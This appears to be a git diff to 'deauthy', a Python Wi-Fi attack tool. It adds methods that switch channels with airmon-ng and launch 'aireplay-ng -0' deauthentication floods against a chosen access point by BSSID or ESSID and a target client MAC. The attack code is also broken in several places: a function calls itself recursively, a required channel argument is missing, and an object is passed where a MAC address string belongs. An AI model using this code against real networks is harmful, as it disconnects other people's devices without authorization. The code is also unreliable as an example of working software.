@@ -1,5 +1,5 @@
 from socket import if_nameindex
-from deauthy.deauthy_types import Interface
+from deauthy.deauthy_types import Interface, BSSID, ESSID
 from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
 from halo import Halo
 
@@ -68,3 +68,44 @@ class Functs:
             modes[mode]()
         except KeyError:
             raise RuntimeError("That's not a valid interface mode.")
+
+    def do_bssid_method():
+        from main import current_wiface, BSSID_METHOD
+        for bssid, channel in Config.BSSIDs.items():
+            BSSID_METHOD.deauth(bssid)
+        try:
+            do_bssid_method()
+        except KeyboardInterrupt:
+            Functs.switch(card=Interface(current_wiface), mode="managed")
+            return
+
+    class ChannelSys:
+        def hopper(channel_number: int):
+            from main import current_wiface
+            """Hop to a different channel"""
+            out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
+
+    class BSSID_METHOD:
+        def deauth(bSSID: BSSID):
+            """"""
+            from main import current_wiface, target_mac
+
+            for key, value in bSSID.bssids:
+                Functs.ChannelSys.hopper()
+                try:
+                    out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                except KeyboardInterrupt:
+                    Functs.switch(Interface(current_wiface), "managed")
+                    return
+
+    class ESSID_METHOD:
+        def deauth(eSSID: ESSID):
+            """"""
+            from main import current_wiface, target_mac
+            channel = eSSID.channel
+            Functs.ChannelSys.hopper(channel)
+            try:
+                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+            except KeyboardInterrupt:
+                Functs.switch(Interface(current_wiface), "managed")
+                return
